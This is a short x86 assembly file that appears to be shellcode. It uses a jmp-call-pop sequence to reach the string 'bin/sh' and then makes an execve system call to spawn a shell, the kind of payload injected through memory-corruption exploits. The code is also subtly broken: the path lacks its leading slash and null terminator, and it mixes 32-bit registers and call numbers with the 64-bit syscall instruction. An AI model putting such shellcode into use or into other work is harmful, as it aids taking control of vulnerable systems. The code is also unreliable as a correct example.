section .text

  global  _start

_start:

  jmp end
code:
  pop ebx			
  xor eax, eax
  mov edx,eax
  push eax		
  push ebx	
  mov ecx,esp
  mov al, 0x0b
  syscall
end:
  call code
  db "bin/sh"
